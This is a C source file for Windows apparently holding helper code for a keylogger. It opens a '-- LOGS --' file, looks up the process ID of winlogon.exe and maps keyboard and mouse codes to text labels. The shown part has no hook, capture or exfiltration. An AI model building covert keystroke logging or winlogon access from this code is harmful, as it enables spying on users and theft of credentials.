#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int getFolderStringLength (TCHAR* str)
{
    size_t lastBackslashPos = 0;
    for (size_t i = 0; i < strlen(str); i++)
    {
        if (str[i] == '\\')
        {
            lastBackslashPos = i;
        }
    }
    return lastBackslashPos;
}

HANDLE openOrCreateFile(char* filename)
{
	HANDLE hFile;
    // Try to create file
    hFile = CreateFile(filename,      
                       GENERIC_WRITE,        
                       0,                   
                       NULL,               
                       CREATE_NEW,        
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    // If creation failed try to edit it
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        hFile = CreateFile(filename,
                           FILE_APPEND_DATA,
                           0,              
                           NULL,          
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("[Terminal failure: Unable to creat or open file.\n]");
        }
    }
    else
    {
        char header[] = "-- LOGS --";
        DWORD dwBytesWritten;
        WriteFile( 
            hFile,
            header,
            strlen(header),
            &dwBytesWritten,
            NULL);
    }
    return hFile;
}

DWORD getWinlogonPID(void)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_stricmp(entry.szExeFile, "winlogon.exe") == 0)
            {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}

char* handleSpecialCase(DWORD vkCode)
{
    switch (vkCode)
    {
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "[ALT]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "[SHIFT]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_F13: return "[F13]";
        case VK_F14: return "[F14]";
        case VK_F15: return "[F15]";
        case VK_F16: return "[F16]";
        case VK_F17: return "[F17]";
        case VK_F18: return "[F18]";
        case VK_F19: return "[F19]";
        case VK_F20: return "[F20]";
        case VK_F21: return "[F21]";
        case VK_F22: return "[F22]";
        case VK_F23: return "[F23]";
        case VK_F24: return "[F24]";
        case VK_LBUTTON: return "[Left mouse button]";
        case VK_RBUTTON: return "[Right mouse button]";
        case VK_CANCEL: return "[Control-break processing]";
        case VK_MBUTTON: return "[Middle mouse button (three-button mouse)]";
        case VK_XBUTTON1: return "[X1 mouse button]";
        case VK_XBUTTON2: return "[X2 mouse button]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_CLEAR: return "[CLEAR]";
        case VK_RETURN: return "[ENTER]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_CAPITAL: return "[CAPS LOCK]";
        case VK_KANA: return "[IME Kana mode]";
        case VK_IME_ON: return "[IME On]";
        case VK_JUNJA: return "[IME Junja mode]";
        case VK_FINAL: return "[IME final mode]";
        case VK_HANJA: return "[IME Hanja mode]";
        case VK_IME_OFF: return "[IME Off]";
        case VK_ESCAPE: return "[ESC]";
        case VK_CONVERT: return "[IME convert]";
        case VK_NONCONVERT: return "[IME nonconvert]";
        case VK_ACCEPT: return "[IME accept]";
        case VK_MODECHANGE: return "[IME mode change request]";
        case VK_SPACE: return "[SPACEBAR]";
        case VK_PRIOR: return "[PAGE UP]";
        case VK_NEXT: return "[PAGE DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT ARROW]";
        case VK_UP: return "[UP ARROW]";
        case VK_RIGHT: return "[RIGHT ARROW]";
        case VK_DOWN: return "[DOWN ARROW]";
        case VK_SELECT: return "[SELECT]";
        case VK_PRINT: return "[PRINT]";
        case VK_EXECUTE: return "[EXECUTE]";
        case VK_SNAPSHOT: return "[PRINT SCREEN]";
        case VK_INSERT: return "[INS]";
        case VK_DELETE: return "[DEL]";
        case VK_HELP: return "[HELP]";
        case VK_LWIN: return "[Left Windows  (Natural board)]";
        case VK_RWIN: return "[Right Windows  (Natural board)]";
        case VK_APPS: return "[Applications  (Natural board)]";
        case VK_SLEEP: return "[Computer Sleep]";
        case VK_NUMPAD0: return "[Numeric pad 0]";
        case VK_NUMPAD1: return "[Numeric pad 1]";
        case VK_NUMPAD2: return "[Numeric pad 2]";
        case VK_NUMPAD3: return "[Numeric pad 3]";
        case VK_NUMPAD4: return "[Numeric pad 4]";
        case VK_NUMPAD5: return "[Numeric pad 5]";
        case VK_NUMPAD6: return "[Numeric pad 6]";
        case VK_NUMPAD7: return "[Numeric pad 7]";
        case VK_NUMPAD8: return "[Numeric pad 8]";
        case VK_NUMPAD9: return "[Numeric pad 9]";
        case VK_MULTIPLY: return "[Multiply]";
        case VK_ADD: return "[Add]";
        case VK_SEPARATOR: return "[Separator]";
        case VK_SUBTRACT: return "[Subtract]";
        case VK_DECIMAL: return "[Decimal]";
        case VK_DIVIDE: return "[Divide]";
        case VK_NUMLOCK: return "[NUM LOCK]";
        case VK_SCROLL: return "[SCROLL LOCK]";
        case VK_BROWSER_BACK: return "[Browser Back]";
        case VK_BROWSER_FORWARD: return "[Browser Forward]";
        case VK_BROWSER_REFRESH: return "[Browser Refresh]";
        case VK_BROWSER_STOP: return "[Browser Stop]";
        case VK_BROWSER_SEARCH: return "[Browser Search]";
        case VK_BROWSER_FAVORITES: return "[Browser Favorites]";
        case VK_BROWSER_HOME: return "[Browser Start and Home]";
        case VK_VOLUME_MUTE: return "[Volume Mute]";
        case VK_VOLUME_DOWN: return "[Volume Down]";
        case VK_VOLUME_UP: return "[Volume Up]";
        case VK_MEDIA_NEXT_TRACK: return "[Next Track]";
        case VK_MEDIA_PREV_TRACK: return "[Previous Track]";
        case VK_MEDIA_STOP: return "[Stop Media]";
        case VK_MEDIA_PLAY_PAUSE: return "[Play/Pause Media]";
        case VK_LAUNCH_MAIL: return "[Start Mail]";
        case VK_LAUNCH_MEDIA_SELECT: return "[Select Media]";
        case VK_LAUNCH_APP1: return "[Start Application 1]";
        case VK_LAUNCH_APP2: return "[Start Application 2]";
        case VK_ATTN: return "[Attn]";
        case VK_CRSEL: return "[CrSel]";
        case VK_EXSEL: return "[ExSel]";
        case VK_EREOF: return "[Erase EOF]";
        case VK_PLAY: return "[Play]";
        case VK_ZOOM: return "[Zoom]";
        case VK_NONAME: return "[Reserved]";
        case VK_PA1: return "[PA1]";
        case VK_OEM_CLEAR: return "[Clear]";
    }
    return NULL;
}
